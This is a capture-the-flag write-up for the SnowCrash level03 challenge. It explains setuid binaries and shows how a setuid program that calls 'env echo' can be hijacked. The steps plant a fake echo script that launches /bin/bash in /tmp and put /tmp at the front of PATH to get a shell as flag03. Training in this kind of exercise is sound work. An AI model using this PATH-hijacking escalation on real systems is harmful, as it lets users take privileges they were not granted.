# Level03

## Research
------------

```bash
level03@SnowCrash:~$ ls -l
-rwsr-sr-x  1  flag03  level03  8627  Mar  5  2016  level03

level03@SnowCrash:~$ whoami
level03

level03@SnowCrash:~$ groups
level03 users
```

`The s in rws stands for setuid meaning set user ID. When applied to an executable file, it sets the effective user ID from that of the real user (the user actually running the program) to that of the program's owner. Most often this is given to a few programs owned by the superuser. When an ordinary user runs a program that is "setuid root" , the program runs with the effective privileges of the superuser. This allows the program to access files and directories that an ordinary user would normally be prohibited from accessing. Clearly, because this raises security concerns, the number of setuid programs must be held to an absolute minimum.` <br/>
https://askubuntu.com/questions/857066/meaning-of-the-access-permissions-rws-and-root-root-of-usr-bin-sudo

So my user ID will go from level03 to flag03 (program's owner) during the execution of level03.

- How can I make this program run getflag ?

```bash
level03@SnowCrash:~$ ./level03
Exploit me

level03@SnowCrash:~$ strings level03
[...]
/usr/bin/env echo Exploit me
[...]
```

We can see the program calls the echo function. The ENV utility will invoke the first sh or bash executable found in the user's $PATH.<br/>
https://stackoverflow.com/questions/8304396/what-is-vulnerable-about-this-c-code <br/>
https://stackoverflow.com/questions/43793040/how-does-usr-bin-env-work-in-a-linux-shebang-line

`The PATH environment variable is a colon-delimited list of directories that your shell searches through when you enter a command.`

## Solution
-----------

If we make a fake echo function, then change the path so that it finds our echo first instead of the real one, tt will run it as flag03.

- Steps:

  - Make a fake echo function
      ```bash
      echo "/bin/bash" > /tmp/echo
      ```
      This will create a fake echo that will execute /bin/bash, that is a new connection to our shell with the current user's permission.
      
  - Make this script executabled by flag03
      ``` bash
      chmod 777 /tmp/echo
      ```
      
  - Change path
      ```bash
      level03@SnowCrash:~$ env
      [...]
      PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
      [...]
      ```
      ``` bash
      export PATH=/tmp:$PATH
      ```
      ```bash
      level03@SnowCrash:~$ env
      [...]
      PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
      [...]
      ```
      We added tmp directory at the start of the path.


```bash
level03@SnowCrash:~$ ./level03
```

You are now `flag03` as a user, because you "opened" a new shell with the rights of flag03.

You can now launch `getflag` with flag03 rights.

https://www.cgsecurity.org/Articles/SecProg/Art1/index-fr.html

